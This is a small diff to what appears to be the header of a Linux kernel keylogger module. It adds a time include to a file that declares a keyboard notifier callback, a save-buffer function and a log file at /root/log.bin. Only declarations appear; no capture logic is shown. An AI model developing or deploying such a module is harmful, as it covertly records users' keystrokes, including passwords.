@@ -11,6 +11,7 @@
 #include <linux/kernel.h>
 #include <linux/slab.h>
 #include <linux/buffer_head.h>
+#include <linux/time.h>
 
 #define LOG_FILE_PATH "/root/log.bin"
 #define LOG_MAX_SIZE 1048576
@@ -21,5 +22,6 @@ int save_buffer(void);
 struct notifier_block nb = {
   .notifier_call = kbd_notifier
 };
+
 
 #endif
